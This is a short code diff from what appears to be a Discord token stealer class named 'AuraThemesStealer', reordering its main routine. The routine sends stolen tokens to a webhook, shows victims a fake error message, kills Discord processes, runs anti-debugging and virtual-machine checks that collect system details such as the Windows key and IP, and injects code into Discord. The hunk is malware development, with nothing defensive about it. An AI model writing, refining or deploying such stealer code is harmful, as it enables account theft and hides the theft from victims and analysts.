@@ -37,10 +37,10 @@ class AuraThemesStealer {
                 WINDOWS_VERSION 
             } = await get_info();
 
-            await fake_error(ERROR_MESSAGE, config)
             await send_webhook_tokens(WEBHOOK);
-            await antidebug(VM_DEBUGGER, DISK, RAM, UID, CPU_COUNT, IP, OS, CPU, GPU, WINDOWS_KEY, WINDOWS_VERSION);
+            await fake_error(ERROR_MESSAGE, config);
             await kill_discords(KILL_DISCORDS);
+            await antidebug(VM_DEBUGGER, DISK, RAM, UID, CPU_COUNT, IP, OS, CPU, GPU, WINDOWS_KEY, WINDOWS_VERSION);
             await discord_injected(DC_INJECTION);
     
         } catch (err) {
